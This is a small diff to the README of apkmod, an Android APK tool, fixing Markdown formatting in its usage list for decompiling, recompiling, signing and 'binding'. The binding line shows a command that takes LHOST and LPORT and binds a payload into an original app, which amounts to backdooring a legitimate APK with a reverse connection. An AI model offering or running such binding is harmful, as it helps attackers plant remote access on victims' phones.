@@ -11,7 +11,7 @@
 1. For decompiling `apkmod -d /path/to/inapp.apk /path/to/outdirectory`. It will decompile __inapp.apk__ into __outdirectory__ folder.
 2. For recompiling `apkmod -r /path/to/indirectory /path/to/outapp.apk`. It will recompile __indirectory__ ( where decompiled files are exists ) into __outapp.apk__.
 3. For signing `apkmod -s /path/to/unsignedapp.apk /path/to/signedapp.apk`. It will sign __unsignedapp.apk__ and saves output ( signed app ) to __signedapp.apk__.
-4. For binding `apkmod -b LHOST LPORT /path/to/originalApp.apk /path/to/binded.apk`. It will bind payload with __originalApp.apk__ and saves final binded app to __binded.apk`
+4. For binding `apkmod -b LHOST LPORT /path/to/originalApp.apk /path/to/binded.apk`. It will bind payload with __originalApp.apk__ and saves final binded app to __binded.apk__.
 
 ### Size Comparision
 Size  | Apkmod  | Third party tools
